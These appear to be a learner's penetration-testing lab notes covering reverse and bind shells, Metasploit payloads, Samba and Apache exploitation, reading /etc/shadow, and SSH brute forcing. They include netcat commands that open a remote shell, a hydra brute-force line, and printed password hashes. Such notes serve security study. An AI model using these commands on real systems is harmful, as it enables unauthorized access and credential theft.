## Reverse Shells vs Bind Shells
Example attackbox - 192.168.1.1
Example Target - 192.168.1.2
### Reverse Shell
- A victim connects to us.
- It is an attack where we will have remote access to the target system. The netcat will be run in the target and we will listen in our machine.
	- We can use netcat "nc". Example of attack
		- nc 192.168.1.1 "port number" -e /bin/sh - Run on the Target
		- nc -nvlp "port number" - Run on attackbox (My box)

### Bind Shell
- We connect to a victim.
- We will have the same access as the reverse shell but this time we will listen to a port on the target and run the net cat on our machine.
- Most of the time we use this to by pass a firewall. 
	- nc -nvlp "port number" -e /bin/sh - Run on the Target
	- nc 192.168.1.2 "port number" - Run on attackbox (My box)




## Staged vs Non-Staged Payloads
- If you try a payload and it does not work, always try the other type. 
- A payload isÂ **the component of the attack which causes harm to the victim**. Much like the Greek soldiers hiding inside the wooden horse in the tale of the Trojan Horse.
### Non Staged payload
- Sends exploit shellcode all at once
- Large in size and won't always work.
- Example: windows/meterpreter_reverse_tcp
	- having the __ in between means it is a non-staged
### Staged payload
- Sends exploit shellcode in stages
- Can be less stable
- - Example: windows/meterpreter/reverse_tcp
	- having the / in between means it is a staged



## Gaining Root with Metasploit
- We know the version of Samba, we can search for vulnerabilities. 
- Using searchsploit samba 2.2.1a and 2.2
- We can notice how often trans2open appears in the searches.

- On Metasploit!
- search trans2open
- Set the rhost and run. But with no success. 
- We notice that we are using a staged payload. We can search for the options for the payload using "set payload" and press tab twice.
- There is no meterpreter with no staged payloads so we try "set payload linux/x86/shell_reverse_tcp"
- And we gain root access.

## Manual Exploitation
- Insted of using metasploit we will research about the target system possible explotations. 
- We know that it is running Apache httpd 1.3.20 ((Unix) on port 80/443. Searching online "apache httpd 1.3.20 ((unix) exploit" we will get this link back "https://github.com/heltonWernik/OpenLuck".
- This will allow us to dowload and use this exploit and gain root access. 

## Post Exploitation (Brief)
With root access:
- use "hashdump".
- We can try to cat /etc/passwd
	- Notice there are 2 users: John and Harold
- We can now cat /etc/shadow
	- This are the password hashes:
		- john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:0:99999:7:::
		- harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::


## Brute Force Attacks (ssh)
- hydra -l root -p /usr/share/wordlists/metaspoit/unix?passwords.txt ssh://192.168.138.131
- Metaspoit
	- search for ssh
	- use the auxiliary/scanner/ssh/ssh_login

## Credential Stuffing and Password Spraying
- What is credential Stuffing?
	- Injecting breached account credentials in hopes of account takeover
- You can use repeter on burpsuit to test usernames and passwords on a log in page.
	- Using sniper for 1 set of words.
	- Using Pitchfork for 2 sets.